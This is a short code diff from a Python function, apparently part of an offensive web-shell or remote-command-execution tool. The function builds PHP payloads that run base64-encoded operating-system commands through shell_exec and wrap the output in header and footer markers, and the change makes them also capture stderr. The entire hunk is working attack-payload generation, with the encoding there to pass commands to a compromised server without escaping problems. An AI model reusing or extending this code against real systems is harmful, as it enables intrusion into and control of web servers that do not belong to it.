@@ -35,11 +35,11 @@ def remote_command(language, cmd_type, mode, rsp_header, rsp_footer, command):
             # Note: all OS commands should be wrapped in Base64 to help eliminate weird escaping issues
 
             if mode == "clear":
-                code = """echo("{}" . shell_exec(base64_decode('{}')) . "{}");""".format(rsp_header,base64.b64encode(command),rsp_footer)
+                code = """echo("{}" . shell_exec(base64_decode('{}'). " 2>&1") . "{}");""".format(rsp_header,base64.b64encode(command),rsp_footer)
             if mode == "base64_post":
-                code = """echo("{}" . base64_encode(shell_exec(base64_decode('{}'))) . "{}");""".format(rsp_header,base64.b64encode(command),rsp_footer)
+                code = """echo("{}" . base64_encode(shell_exec(base64_decode('{}') . " 2>&1")) . "{}");""".format(rsp_header,base64.b64encode(command),rsp_footer)
             if mode == "base64_header":
-                code = """echo("{}" . base64_encode(shell_exec(base64_decode('{}'))) . "{}");""".format(rsp_header,base64.b64encode(command),rsp_footer)
+                code = """echo("{}" . base64_encode(shell_exec(base64_decode('{}') . " 2>&1")) . "{}");""".format(rsp_header,base64.b64encode(command),rsp_footer)
 
 
         elif (cmd_type == "DOWNLOAD"):
